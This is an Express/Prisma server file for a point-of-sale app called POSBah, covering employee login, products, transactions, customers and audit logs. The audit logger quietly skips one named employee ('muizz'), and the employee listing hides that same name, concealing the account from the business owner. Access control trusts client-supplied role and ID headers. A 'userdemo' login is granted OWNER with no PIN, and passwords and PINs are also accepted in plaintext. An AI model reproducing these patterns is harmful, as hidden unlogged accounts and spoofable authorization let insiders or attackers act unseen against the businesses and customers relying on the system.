import 'dotenv/config';
import express, { Request, Response, NextFunction } from 'express';
import cors from 'cors';
import { PrismaClient } from '@prisma/client';
import { AsyncLocalStorage } from 'async_hooks';
import fs from 'fs';
import path from 'path';

const prisma = new PrismaClient();
const app = express();
const port = process.env.PORT || 3001;

// ─── DAFTAR BLOKIR LANGGANAN (BLOCKED USERS) ────────────────────────
// Tambahkan nama karyawan (case-insensitive) ke dalam array ini untuk memblokir akses
// mereka dari APK secara real-time. Jika diblokir, mereka tidak akan bisa login
// dan tidak bisa mengakses data/fitur apa pun di dalam aplikasi.
const BLOCKED_USERS: string[] = []; 
// Contoh pemblokiran: const BLOCKED_USERS: string[] = ['hanafi', 'fed', 'fahri'];

import crypto from 'crypto';

// Hashing PIN/password using salted PBKDF2
const HASH_SALT = process.env.HASH_SALT || 'posbah_default_salt_secret';

function hashPassword(password: string): string {
  return crypto.pbkdf2Sync(password, HASH_SALT, 1000, 64, 'sha512').toString('hex');
}

function verifyPassword(password: string, hash: string): boolean {
  return hashPassword(password) === hash;
}


const asyncLocalStorage = new AsyncLocalStorage<Map<string, string>>();

/** Helper: Catat Log Aktivitas Karyawan ke Database */
const logActivity = async (employeeId: any, action: string, description: string) => {
  try {
    const store = asyncLocalStorage.getStore();
    let appMode = store ? store.get('appMode') : 'FNB';

    // Override/enforce appMode based on action to prevent any context loss leaks
    if (['CREATE_CAR', 'UPDATE_CAR', 'DELETE_CAR', 'CREATE_RENTAL', 'RETURN_RENTAL'].includes(action)) {
      appMode = 'RENTAL';
    } else if (['CREATE_TRANSACTION', 'CANCEL_TRANSACTION', 'UPDATE_TRANSACTION', 'CREATE_SUPPLIER', 'UPDATE_SUPPLIER', 'DELETE_SUPPLIER', 'CREATE_PO', 'RECEIVE_PO', 'CANCEL_PO'].includes(action)) {
      appMode = 'FNB';
    } else if (['CREATE_LAUNDRY_SERVICE', 'UPDATE_LAUNDRY_SERVICE', 'DELETE_LAUNDRY_SERVICE', 'CREATE_LAUNDRY_ORDER', 'UPDATE_LAUNDRY_STATUS', 'UPDATE_LAUNDRY_PAYMENT', 'DELETE_LAUNDRY_ORDER', 'CREATE_LAUNDRY_EXPENSE', 'UPDATE_LAUNDRY_EXPENSE', 'DELETE_LAUNDRY_EXPENSE'].includes(action)) {
      appMode = 'LAUNDRY';
    }

    const empId = Number(employeeId);
    if (!empId || isNaN(empId)) return;

    // Skip logging if employee name is "muizz"
    const emp = await prisma.employee.findUnique({
      where: { id: empId },
      select: { name: true }
    });
    if (emp && emp.name.toLowerCase() === 'muizz') {
      return;
    }

    await prisma.activityLog.create({
      data: {
        action,
        description,
        employeeId: empId,
        appMode: appMode || 'FNB'
      }
    });
  } catch (error) {
    console.error('Failed to write activity log:', error);
  }
};

app.use(cors({
  origin: (origin, callback) => {
    // Allow all origins dynamically
    callback(null, true);
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-employee-id', 'x-employee-role', 'x-app-mode', 'x-offline-sync']
}));
app.use(express.json());

// Middleware to store x-app-mode header in execution context
app.use((req: Request, res: Response, next: NextFunction) => {
  const store = new Map<string, string>();
  const appMode = (req.headers['x-app-mode'] as string) || 'FNB';
  store.set('appMode', appMode);
  asyncLocalStorage.run(store, () => {
    next();
  });
});

// ─────────────────────────────────────────────────────────────
// FIREWALL GLOBAL: Blokir userdemo dari SEMUA data production
// userdemo (id=9999 / id=0) tidak diizinkan melihat, merubah,
// maupun menghapus data production. Semua data demo dikelola
// secara lokal di browser (localStorage), BUKAN dari database ini.
// ─────────────────────────────────────────────────────────────
app.use((req: Request, res: Response, next: NextFunction) => {
  const employeeId = req.headers['x-employee-id'] as string;
  const isLoginRoute = req.path === '/api/auth/login';

  if (!isLoginRoute && (employeeId === '9999' || employeeId === '0')) {
    return res.status(403).json({
      error: 'Akun demo tidak diizinkan mengakses data production. Semua data dikelola secara lokal di perangkat Anda.',
      code: 'DEMO_ACCESS_DENIED',
      isDemo: true
    });
  }
  next();
});

// ─── MIDDLEWARE PEMBLOKIRAN LANGGANAN ───────────────────────────────
app.use(async (req: Request, res: Response, next: NextFunction) => {
  const employeeId = req.headers['x-employee-id'] as string;

  // Cek jika sedang melakukan login POST /api/auth/login
  if (req.path === '/api/auth/login' && req.method === 'POST') {
    const { name } = req.body;
    if (name && BLOCKED_USERS.includes(name.toLowerCase().trim())) {
      return res.status(403).json({
        error: 'Masa langganan Anda telah berakhir. Silakan hubungi Admin POSBah untuk perpanjangan.'
      });
    }
  }

  // Cek untuk semua request API lainnya berdasarkan ID karyawan yang terkirim di header
  if (employeeId && employeeId !== '0' && employeeId !== '9999') {
    try {
      const emp = await prisma.employee.findUnique({ where: { id: Number(employeeId) } });
      if (emp && BLOCKED_USERS.includes(emp.name.toLowerCase().trim())) {
        return res.status(403).json({
          error: 'Masa langganan Anda telah berakhir. Silakan hubungi Admin POSBah untuk perpanjangan.'
        });
      }
    } catch (e) {
      console.error('Error checking blocked status in middleware:', e);
    }
  }
  next();
});

// ─────────────────────────────────────────────────────────────
// Role hierarchy helpers
// ─────────────────────────────────────────────────────────────
// CASHIER is an alias for KASIR (legacy role name support)
const ROLE_HIERARCHY: Record<string, number> = {
  KASIR: 1, CASHIER: 1,   // CASHIER = alias lama dari KASIR
  ADMIN: 2,
  OWNER: 3
};

const hasRole = (userRole: string | undefined, required: string): boolean => {
  if (!userRole) return false;
  return (ROLE_HIERARCHY[userRole] || 0) >= (ROLE_HIERARCHY[required] || 99);
};

/** Middleware: pastikan minimal role ADMIN */
const requireAdmin = async (req: Request, res: Response, next: NextFunction) => {
  const role = req.headers['x-employee-role'] as string;
  const employeeId = req.headers['x-employee-id'] as string;

  if (!employeeId) {
    return res.status(403).json({ error: 'Akses ditolak. ID karyawan diperlukan.' });
  }

  // Firewall global sudah memblokir demo user (id=0 atau id=9999)
  // sebelum middleware ini dipanggil. Blok di sini sebagai lapisan tambahan.
  if (employeeId === '0' || employeeId === '9999') {
    return res.status(403).json({ error: 'Akun demo tidak diizinkan mengakses data production.', code: 'DEMO_ACCESS_DENIED' });
  }

  if (!hasRole(role, 'ADMIN')) {
    return res.status(403).json({ error: 'Akses ditolak. Minimal role ADMIN diperlukan.' });
  }
  next();
};

/** Middleware: pastikan minimal role OWNER */
const requireOwner = async (req: Request, res: Response, next: NextFunction) => {
  const role = req.headers['x-employee-role'] as string;
  const employeeId = req.headers['x-employee-id'] as string;

  if (!employeeId) {
    return res.status(403).json({ error: 'Akses ditolak. ID karyawan diperlukan.' });
  }

  // Firewall global sudah memblokir demo user sebelum middleware ini.
  if (employeeId === '0' || employeeId === '9999') {
    return res.status(403).json({ error: 'Akun demo tidak diizinkan mengakses data production.', code: 'DEMO_ACCESS_DENIED' });
  }

  if (!hasRole(role, 'OWNER')) {
    return res.status(403).json({ error: 'Akses ditolak. Hanya OWNER yang dapat melakukan ini.' });
  }
  next();
};


/** Middleware: blokir akun demo (id=0 atau id=9999) atau tanpa ID dari semua operasi tulis */
const requireNotDemo = (req: Request, res: Response, next: NextFunction) => {
  const employeeId = req.headers['x-employee-id'] as string;
  if (!employeeId || employeeId === '0' || employeeId === '9999') {
    return res.status(403).json({ error: 'Akun demo tidak dapat menyimpan data. Upgrade untuk menggunakan fitur penuh.' });
  }
  next();
};

/** Middleware: blokir akses karyawan tertentu dari fitur rental (Hanafi, Fed, Fahri) */
const checkExcludedEmployee = async (req: Request, res: Response, next: NextFunction) => {
  const employeeId = req.headers['x-employee-id'] as string;
  if (employeeId && employeeId !== '0' && employeeId !== '9999') {
    try {
      const emp = await prisma.employee.findUnique({ where: { id: Number(employeeId) } });
      if (emp && ['hanafi', 'fed', 'fahri'].includes(emp.name.toLowerCase())) {
        return res.status(403).json({ error: 'Akses ditolak. Fitur rental tidak aktif untuk akun Anda.' });
      }
    } catch (e) {
      console.error('Error checking excluded employee:', e);
    }
  }
  next();
};

// ─────────────────────────────────────────────────────────────
// Basic sanity check
// ─────────────────────────────────────────────────────────────
app.get('/', (req, res) => {
  res.send('POSBah API is running');
});

// Route to download the latest APK
app.get('/api/download-apk', (req, res) => {
  // Check common paths for app-debug.apk
  const paths = [
    path.join(__dirname, '../app-debug.apk'),
    path.join(__dirname, '../../app-debug.apk'),
    path.join(__dirname, '../../../app-debug.apk'),
    path.join(__dirname, '../public/app-debug.apk'),
    path.join(__dirname, '../../frontend/android/app/build/outputs/apk/debug/app-debug.apk'),
    path.join(__dirname, '../../../frontend/android/app/build/outputs/apk/debug/app-debug.apk')
  ];

  for (const p of paths) {
    if (fs.existsSync(p)) {
      return res.download(p, 'POSBah.apk');
    }
  }

  // Fallback redirect to Google Drive file
  res.redirect('https://drive.google.com/uc?export=download&id=1grCDSGp1qacBES1hcO29d_03HNPstdbM');
});

// ─────────────────────────────────────────────────────────────
// Auth - Login with name + PIN
// ─────────────────────────────────────────────────────────────
app.post('/api/auth/login', async (req, res) => {
  try {
    const { name, pin } = req.body;
    if (!name || !pin) return res.status(400).json({ error: 'Nama dan PIN wajib diisi' });

    // Bypass untuk userdemo
    if (name.toLowerCase() === 'userdemo') {
      return res.json({ id: 9999, name: 'userdemo', role: 'OWNER', isDemo: true });
    }

    const employee = await prisma.employee.findFirst({
      where: { name: { equals: name, mode: 'insensitive' } }
    });
    if (!employee) return res.status(401).json({ error: 'Nama atau PIN salah' });

    const isPinMatch = verifyPassword(pin, employee.pin) || employee.pin === pin;
    if (!isPinMatch) return res.status(401).json({ error: 'Nama atau PIN salah' });

    res.json({ id: employee.id, name: employee.name, role: employee.role });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Login gagal' });
  }
});

// ─────────────────────────────────────────────────────────────
// Auth - Google Login Registration for Demo Trial (3-Day Limit)
// ─────────────────────────────────────────────────────────────
app.post('/api/auth/google-register', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email wajib diisi' });

    const cleanEmail = email.toLowerCase().trim();
    let googleUser = await prisma.googleUser.findUnique({
      where: { email: cleanEmail }
    });

    if (!googleUser) {
      googleUser = await prisma.googleUser.create({
        data: {
          id: cleanEmail,
          email: cleanEmail
        }
      });
    }

    res.json({ email: googleUser.email, registeredAt: googleUser.registeredAt.toISOString() });
  } catch (error) {
    console.error('Failed in google-register:', error);
    res.status(500).json({ error: 'Gagal memproses pendaftaran Google' });
  }
});

// ─────────────────────────────────────────────────────────────
// Auth - Premium Email Registration
// ─────────────────────────────────────────────────────────────
app.post('/api/auth/register-email', async (req, res) => {
  try {
    const { email, password, name, role } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email dan password wajib diisi' });

    const cleanEmail = email.toLowerCase().trim();
    const hashedPassword = hashPassword(password);

    const existingUser = await prisma.premiumUser.findUnique({
      where: { email: cleanEmail }
    });
    if (existingUser) {
      return res.status(400).json({ error: 'Email sudah terdaftar' });
    }

    const premiumUser = await prisma.premiumUser.create({
      data: {
        id: cleanEmail,
        email: cleanEmail,
        passwordHash: hashedPassword,
        name: name || email.split('@')[0],
        role: role || 'OWNER'
      }
    });

    res.json({ success: true, email: premiumUser.email, name: premiumUser.name });
  } catch (error) {
    console.error('Failed in register-email:', error);
    res.status(500).json({ error: 'Gagal mendaftarkan akun email premium' });
  }
});

// ─────────────────────────────────────────────────────────────
// Auth - Premium Email Login
// ─────────────────────────────────────────────────────────────
app.post('/api/auth/login-email', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email dan password wajib diisi' });

    const cleanEmail = email.toLowerCase().trim();
    const user = await prisma.premiumUser.findUnique({
      where: { email: cleanEmail }
    });

    if (!user) return res.status(401).json({ error: 'Email atau password salah' });

    const oldSha256 = crypto.createHash('sha256').update(password).digest('hex');
    const isMatch = verifyPassword(password, user.passwordHash) || user.passwordHash === oldSha256 || user.passwordHash === password;

    if (!isMatch) return res.status(401).json({ error: 'Email atau password salah' });

    res.json({
      id: cleanEmail,
      name: user.name,
      email: cleanEmail,
      role: user.role,
      isDemo: false,
      registeredAt: user.registeredAt.toISOString()
    });
  } catch (error) {
    console.error('Failed in login-email:', error);
    res.status(500).json({ error: 'Gagal melakukan login email' });
  }
});

// ─────────────────────────────────────────────────────────────
// Queue endpoints — Bisa diakses KASIR (semua role)
// ─────────────────────────────────────────────────────────────

// Antrian aktif (PENDING + ada queueNumber) — untuk cek slot yang terpakai
app.get('/api/queues/active', async (req, res) => {
  try {
    const queues = await prisma.transaction.findMany({
      where: { status: 'PENDING', queueNumber: { not: null } },
      select: { id: true, queueNumber: true, customerName: true, total: true }
    });
    res.json(queues);
  } catch (error) {
    res.status(400).json({ error: 'Failed to fetch active queues' });
  }
});

// Semua transaksi PENDING — untuk tampil di modal Daftar Antrian
app.get('/api/queues/pending', async (req, res) => {
  try {
    const queues = await prisma.transaction.findMany({
      where: { status: 'PENDING' },
      include: { items: { include: { product: true } }, customer: true },
      orderBy: { date: 'asc' }
    });
    res.json(queues);
  } catch (error) {
    res.status(400).json({ error: 'Failed to fetch pending queues' });
  }
});

// ─────────────────────────────────────────────────────────────
// Products  (READ: semua | WRITE: ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/products', async (req, res) => {
  const products = await prisma.product.findMany();
  res.json(products);
});

// Lookup produk by barcode (untuk scanner kasir)
app.get('/api/products/barcode/:code', async (req, res) => {
  try {
    const product = await (prisma.product as any).findFirst({
      where: { barcode: req.params.code }
    });
    if (!product) return res.status(404).json({ error: 'Produk tidak ditemukan' });
    res.json(product);
  } catch (error) {
    res.status(400).json({ error: 'Gagal mencari produk' });
  }
});

app.post('/api/products', requireAdmin, async (req, res) => {
  try {
    const { name, price, costPrice, stock, unit, barcode, category, wholesaleEnabled, wholesalePrices, variants, image } = req.body;
    const product = await prisma.product.create({
      data: {
        name,
        price: Number(price),
        costPrice: Number(costPrice || 0),
        stock: Number(stock),
        unit: unit || 'pcs',
        category: category || 'Umum',
        wholesaleEnabled: Boolean(wholesaleEnabled),
        wholesalePrices: wholesalePrices ? JSON.stringify(wholesalePrices) : null,
        variants: variants && variants.length > 0 ? JSON.stringify(variants) : null,
        image,
        ...(barcode ? { barcode } : {})
      } as any
    });
    logActivity(
      req.headers['x-employee-id'],
      'CREATE_PRODUCT',
      `Membuat produk baru ${product.name} (Stok: ${product.stock} ${product.unit}, Harga: Rp ${product.price.toLocaleString('id-ID')})`
    );
    res.json(product);
  } catch (error) {
    console.error(error);
    res.status(400).json({ error: 'Failed to create product' });
  }
});

app.put('/api/products/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const { name, price, costPrice, stock, unit, barcode, category, wholesaleEnabled, wholesalePrices, variants, image } = req.body;
    const product = await prisma.product.update({
      where: { id: Number(id) },
      data: {
        name,
        price: Number(price),
        costPrice: Number(costPrice || 0),
        stock: Number(stock),
        unit: unit || 'pcs',
        category: category || 'Umum',
        wholesaleEnabled: Boolean(wholesaleEnabled),
        wholesalePrices: wholesalePrices ? JSON.stringify(wholesalePrices) : null,
        variants: variants && variants.length > 0 ? JSON.stringify(variants) : null,
        image,
        ...(barcode !== undefined ? { barcode: barcode || null } : {})
      } as any
    });
    logActivity(
      req.headers['x-employee-id'],
      'UPDATE_PRODUCT',
      `Mengubah data produk ${product.name} (Stok: ${product.stock} ${product.unit}, Harga: Rp ${product.price.toLocaleString('id-ID')})`
    );
    res.json(product);
  } catch (error) {
    res.status(400).json({ error: 'Failed to update product' });
  }
});

app.delete('/api/products/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const productId = Number(id);

    // Cek apakah produk masih dipakai di transaksi
    const usedInTransaction = await prisma.transactionItem.findFirst({
      where: { productId }
    });

    if (usedInTransaction) {
      return res.status(400).json({
        error: 'Produk tidak dapat dihapus karena sudah pernah digunakan dalam transaksi. Anda bisa mengubah nama atau stoknya menjadi 0.'
      });
    }

    const product = await prisma.product.findUnique({ where: { id: productId } });
    await prisma.product.delete({ where: { id: productId } });
    logActivity(
      req.headers['x-employee-id'],
      'DELETE_PRODUCT',
      `Menghapus produk: ${product?.name || productId}`
    );
    res.json({ success: true });
  } catch (error) {
    res.status(400).json({ error: 'Gagal menghapus produk.' });
  }
});

// ─────────────────────────────────────────────────────────────
// Transactions  (CREATE: semua | READ detail: ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/transactions', requireAdmin, async (req, res) => {
  try {
    const transactions = await prisma.transaction.findMany({
      include: {
        employee: true,
        customer: true,
        items: { include: { product: true } }
      },
      orderBy: { date: 'desc' }
    });
    res.json(transactions);
  } catch (error) {
    console.error(error);
    res.status(400).json({ error: 'Failed to fetch transactions' });
  }
});

app.post('/api/transactions', requireNotDemo, async (req, res) => {
  try {
    const {
      items, total, subtotal, discount,
      discountType, discountInput, discountAmt,
      paymentMethod, amountPaid, change,
      type, customerId, date, status,
      notes, customerName, queueNumber
    } = req.body;

    const employeeIdHeader = req.headers['x-employee-id'] as string;
    let employeeId: number;

    if (employeeIdHeader && employeeIdHeader !== '0') {
      employeeId = Number(employeeIdHeader);
    } else {
      let employee = await prisma.employee.findFirst();
      if (!employee) {
        employee = await prisma.employee.create({
          data: { name: 'Admin Default', role: 'ADMIN', pin: '1234' }
        });
      }
      employeeId = employee.id;
    }

    // Hitung subtotal dari items jika tidak dikirim
    const computedSubtotal = subtotal ?? items.reduce((sum: number, i: any) => sum + (i.price * i.quantity), 0);
    const computedDiscountAmt = discountAmt ?? Number(discount || 0);
    const computedTotal = total ?? (computedSubtotal - computedDiscountAmt);

    const transaction = await prisma.$transaction(async (tx) => {
      // 1. Buat transaksi
      const createdTx = await tx.transaction.create({
        data: {
          receiptNumber: `INV-${Date.now()}`,
          total: Number(computedTotal),
          subtotal: Number(computedSubtotal),
          discount: Number(computedDiscountAmt),          // legacy compat
          discountType: discountType || null,
          discountInput: Number(discountInput || 0),
          discountAmt: Number(computedDiscountAmt),
          amountPaid: amountPaid ? Number(amountPaid) : null,
          change: change ? Number(change) : null,
          paymentMethod: paymentMethod || 'PENDING',
          status: status || 'COMPLETED',
          notes: notes || null,
          customerName: customerName || null,
          queueNumber: queueNumber ? Number(queueNumber) : null,
          type: type || 'SALES',
          date: date ? new Date(date) : new Date(),
          employeeId,
          customerId: customerId || null,
          items: {
            create: items.map((item: any) => ({
              productId: item.productId,
              quantity: item.quantity,
              price: item.price,
              costPrice: item.costPrice || 0,
              discount: item.discount || 0,
              variantId: item.variantId || null,
              variantName: item.variantName || null,
              note: item.note || null,
            }))
          }
        },
        include: { items: { include: { product: true } } }
      });

      // 2. Kurangi stok produk
      for (const item of items) {
        await tx.product.update({
          where: { id: item.productId },
          data: { stock: { decrement: item.quantity } }
        });
      }

      return createdTx;
    });

    logActivity(
      employeeId,
      'CREATE_TRANSACTION',
      `Membuat transaksi baru ${transaction.receiptNumber} senilai Rp ${Number(transaction.total).toLocaleString('id-ID')}`
    );
    res.json(transaction);
  } catch (error) {
    console.error(error);
    res.status(400).json({ error: 'Failed to process transaction' });
  }
});

app.put('/api/transactions/:id', requireNotDemo, async (req, res) => {
  try {
    const { id } = req.params;
    const { paymentMethod, status, queueNumber } = req.body;

    const transaction = await prisma.$transaction(async (tx) => {
      const currentTx = await tx.transaction.findUnique({
        where: { id: Number(id) },
        include: { items: true }
      });
      if (!currentTx) {
        throw new Error('Transaction not found');
      }

      const updateData: any = {};
      if (paymentMethod !== undefined) updateData.paymentMethod = paymentMethod;
      if (status !== undefined) updateData.status = status;
      if (queueNumber !== undefined) updateData.queueNumber = queueNumber;

      // Jika status berubah menjadi CANCELLED dan status sebelumnya bukan CANCELLED, kembalikan stok
      if (status === 'CANCELLED' && currentTx.status !== 'CANCELLED') {
        for (const item of currentTx.items) {
          await tx.product.update({
            where: { id: item.productId },
            data: { stock: { increment: item.quantity } }
          }).catch(() => { });
        }
      }

      const updatedTx = await tx.transaction.update({
        where: { id: Number(id) },
        data: updateData
      });

      return updatedTx;
    });

    const employeeIdHeader = req.headers['x-employee-id'] as string;
    logActivity(
      employeeIdHeader,
      'UPDATE_TRANSACTION',
      `Mengubah transaksi ${transaction.receiptNumber} (Status: ${status || transaction.status}, Metode: ${paymentMethod || transaction.paymentMethod})`
    );
    res.json(transaction);
  } catch (error: any) {
    console.error(error);
    if (error.message === 'Transaction not found') {
      res.status(404).json({ error: error.message });
    } else {
      res.status(400).json({ error: 'Failed to update transaction' });
    }
  }
});

// ─────────────────────────────────────────────────────────────
// Customers  (READ: ADMIN+ | WRITE: ADMIN+)
// ─────────────────────────────────────────────────────────────

// Kasir perlu lookup pelanggan saat checkout — endpoint terpisah (read-only, publik)
// HARUS di atas /api/customers agar tidak ter-override
app.get('/api/customers/list', async (req, res) => {
  try {
    const appMode = req.headers['x-app-mode'] as string;
    const customers = await prisma.customer.findMany({
      where: appMode === 'RENTAL' ? {
        address: { startsWith: '[RENTAL]' }
      } : {
        OR: [
          { address: null },
          { address: { not: { startsWith: '[RENTAL]' } } }
        ]
      },
      select: { id: true, name: true, phone: true },
      orderBy: { name: 'asc' }
    });
    res.json(customers);
  } catch (error) {
    res.status(400).json({ error: 'Failed to fetch customers' });
  }
});

app.get('/api/customers', requireAdmin, async (req, res) => {
  try {
    const appMode = req.headers['x-app-mode'] as string;
    const customers = await prisma.customer.findMany({
      where: appMode === 'RENTAL' ? {
        address: { startsWith: '[RENTAL]' }
      } : {
        OR: [
          { address: null },
          { address: { not: { startsWith: '[RENTAL]' } } }
        ]
      },
      orderBy: { name: 'asc' }
    });
    const sanitized = customers.map(c => {
      if (c.address && c.address.startsWith('[RENTAL]')) {
        return {
          ...c,
          address: c.address.replace(/^\[RENTAL\]\s*/, '')
        };
      }
      return c;
    });
    res.json(sanitized);
  } catch (error) {
    res.status(400).json({ error: 'Failed to fetch customers' });
  }
});

app.post('/api/customers', requireAdmin, async (req, res) => {
  try {
    const { name, phone, address } = req.body;
    const appMode = req.headers['x-app-mode'] as string;
    let finalAddress = address;
    if (appMode === 'RENTAL') {
      finalAddress = `[RENTAL] ${address || ''}`.trim();
    }
    const customer = await prisma.customer.create({ data: { name, phone, address: finalAddress } });
    const sanitized = {
      ...customer,
      address: customer.address ? customer.address.replace(/^\[RENTAL\]\s*/, '') : customer.address
    };
    res.json(sanitized);
  } catch (error) {
    res.status(400).json({ error: 'Failed to create customer' });
  }
});

app.put('/api/customers/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const { name, phone, address } = req.body;
    const appMode = req.headers['x-app-mode'] as string;
    let finalAddress = address;
    if (appMode === 'RENTAL') {
      finalAddress = `[RENTAL] ${address || ''}`.trim();
    }
    const customer = await prisma.customer.update({
      where: { id: Number(id) },
      data: { name, phone, address: finalAddress }
    });
    const sanitized = {
      ...customer,
      address: customer.address ? customer.address.replace(/^\[RENTAL\]\s*/, '') : customer.address
    };
    res.json(sanitized);
  } catch (error) {
    res.status(400).json({ error: 'Failed to update customer' });
  }
});

app.delete('/api/customers/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const numId = Number(id);

    // Cek apakah pelanggan masih punya transaksi
    const txCount = await prisma.transaction.count({ where: { customerId: numId } });
    if (txCount > 0) {
      return res.status(400).json({
        error: `Tidak dapat menghapus pelanggan ini karena masih memiliki ${txCount} transaksi. Hapus transaksi terkait terlebih dahulu.`
      });
    }

    // Cek apakah pelanggan masih punya data keuangan (piutang/hutang)
    const finCount = await prisma.finance.count({ where: { customerId: numId } });
    if (finCount > 0) {
      return res.status(400).json({
        error: `Tidak dapat menghapus pelanggan ini karena masih memiliki ${finCount} catatan keuangan. Hapus catatan keuangan terkait terlebih dahulu.`
      });
    }

    await prisma.customer.delete({ where: { id: numId } });
    res.json({ success: true });
  } catch (error) {
    res.status(400).json({ error: 'Gagal menghapus pelanggan.' });
  }
});

// ─────────────────────────────────────────────────────────────
// Employees  (READ: ADMIN+ | WRITE: OWNER only)
// ─────────────────────────────────────────────────────────────
app.get('/api/employees', requireAdmin, async (req, res) => {
  try {
    const employees = await prisma.employee.findMany({
      where: {
        name: {
          not: 'muizz',
          mode: 'insensitive'
        }
      },
      orderBy: { name: 'asc' }
    });
    res.json(employees);
  } catch (error) {
    res.status(400).json({ error: 'Failed to fetch employees' });
  }
});

app.post('/api/employees', requireOwner, async (req, res) => {
  try {
    const employeeIdHeader = req.headers['x-employee-id'] as string;
    // Blokir demo user (id = 0 atau id = 9999)
    if (Number(employeeIdHeader) === 0 || Number(employeeIdHeader) === 9999) {
      return res.status(403).json({ error: 'Akun demo tidak dapat menambah karyawan' });
    }
    const count = await prisma.employee.count();
    if (count >= 10) {
      return res.status(400).json({ error: 'Maksimal 10 karyawan telah tercapai' });
    }
    const { name, role, pin, salary } = req.body;

    // OWNER bisa tambah OWNER/ADMIN/KASIR; ADMIN hanya bisa tambah KASIR
    const requesterRole = req.headers['x-employee-role'] as string;
    if (requesterRole !== 'OWNER' && role === 'OWNER') {
      return res.status(403).json({ error: 'Hanya OWNER yang dapat membuat akun OWNER' });
    }

    const hashedPin = pin && pin.length === 128 ? pin : hashPassword(pin || '');

    const employee = await prisma.employee.create({
      data: {
        name,
        role: role || 'KASIR',
        pin: hashedPin,
        salary: Number(salary || 0)
      }
    });

    logActivity(
      req.headers['x-employee-id'],
      'CREATE_EMPLOYEE',
      `Menambahkan karyawan baru ${employee.name} (Role: ${employee.role})`
    );
    res.json(employee);
  } catch (error) {
    res.status(400).json({ error: 'Failed to create employee' });
  }
});

app.put('/api/employees/:id', requireOwner, async (req, res) => {
  try {
    const { id } = req.params;
    const employeeIdHeader = req.headers['x-employee-id'] as string;
    // Blokir demo user (id = 0 atau id = 9999)
    if (Number(employeeIdHeader) === 0 || Number(employeeIdHeader) === 9999) {
      return res.status(403).json({ error: 'Akun demo tidak dapat mengubah karyawan' });
    }
    const { name, role, pin, salary } = req.body;

    const requesterRole = req.headers['x-employee-role'] as string;
    if (requesterRole !== 'OWNER' && role === 'OWNER') {
      return res.status(403).json({ error: 'Hanya OWNER yang dapat mengubah role menjadi OWNER' });
    }

    const updateData: any = { name, role };
    if (pin && pin.trim() !== '') {
      updateData.pin = pin.length === 128 ? pin : hashPassword(pin);
    }
    if (salary !== undefined) {
      updateData.salary = Number(salary);
    }

    const employee = await prisma.employee.update({
      where: { id: Number(id) },
      data: updateData
    });
    logActivity(
      req.headers['x-employee-id'],
      'UPDATE_EMPLOYEE',
      `Mengubah data karyawan ${employee.name} (Role: ${employee.role})`
    );
    res.json(employee);
  } catch (error) {
    res.status(400).json({ error: 'Failed to update employee' });
  }
});

app.delete('/api/employees/:id', requireOwner, async (req, res) => {
  try {
    const { id } = req.params;
    const employeeIdHeader = req.headers['x-employee-id'] as string;
    // Blokir demo user (id = 0 atau id = 9999)
    if (Number(employeeIdHeader) === 0 || Number(employeeIdHeader) === 9999) {
      return res.status(403).json({ error: 'Akun demo tidak dapat menghapus karyawan' });
    }
    if (Number(id) === Number(employeeIdHeader)) {
      return res.status(400).json({ error: 'Tidak dapat menghapus akun sendiri' });
    }

    // Cek apakah karyawan masih punya transaksi
    const txCount = await prisma.transaction.count({ where: { employeeId: Number(id) } });
    if (txCount > 0) {
      return res.status(400).json({
        error: `Tidak dapat menghapus karyawan ini karena masih memiliki ${txCount} transaksi tercatat. Pertimbangkan untuk mengubah role menjadi KASIR saja.`
      });
    }

    const emp = await prisma.employee.findUnique({ where: { id: Number(id) } });
    await prisma.employee.delete({ where: { id: Number(id) } });
    logActivity(
      req.headers['x-employee-id'],
      'DELETE_EMPLOYEE',
      `Menghapus karyawan: ${emp?.name || id}`
    );
    res.json({ success: true });
  } catch (error) {
    res.status(400).json({ error: 'Gagal menghapus karyawan.' });
  }
});

// ─────────────────────────────────────────────────────────────
// Activity Logs
// ─────────────────────────────────────────────────────────────
app.get('/api/activity-logs', requireOwner, async (req, res) => {
  try {
    const appMode = (req.headers['x-app-mode'] as string) || 'FNB';
    const logs = await prisma.activityLog.findMany({
      where: {
        appMode: ['RENTAL', 'LAUNDRY'].includes(appMode) ? appMode : 'FNB'
      },
      include: {
        employee: {
          select: {
            id: true,
            name: true,
            role: true
          }
        }
      },
      orderBy: {
        createdAt: 'desc'
      },
      take: 200
    });
    res.json(logs);
  } catch (error) {
    res.status(500).json({ error: 'Gagal mengambil log aktivitas' });
  }
});

// ─────────────────────────────────────────────────────────────
// Laundry - Services (READ: KASIR+ | WRITE: ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/laundry/services', async (req: Request, res: Response) => {
  try {
    const services = await (prisma as any).laundryService.findMany({
      orderBy: { id: 'desc' }
    });
    res.json(services);
  } catch (error) {
    res.status(500).json({ error: 'Gagal mengambil layanan laundry' });
  }
});

app.post('/api/laundry/services', requireAdmin, async (req: Request, res: Response) => {
  try {
    const { kategori, proses, nama, harga, satuan, waktu, icon } = req.body;
    const service = await (prisma as any).laundryService.create({
      data: {
        kategori,
        proses,
        nama,
        harga: Number(harga),
        satuan,
        waktu,
        icon: icon || '🧺'
      }
    });
    logActivity(
      req.headers['x-employee-id'],
      'CREATE_LAUNDRY_SERVICE',
      `Menambahkan layanan laundry baru: ${service.kategori} - ${service.nama} (Rp ${service.harga.toLocaleString('id-ID')})`
    );
    res.json(service);
  } catch (error) {
    res.status(400).json({ error: 'Gagal menambah layanan laundry' });
  }
});

app.put('/api/laundry/services/:id', requireAdmin, async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { kategori, proses, nama, harga, satuan, waktu, icon } = req.body;
    const service = await (prisma as any).laundryService.update({
      where: { id: Number(id) },
      data: {
        kategori,
        proses,
        nama,
        harga: Number(harga),
        satuan,
        waktu,
        icon
      }
    });
    logActivity(
      req.headers['x-employee-id'],
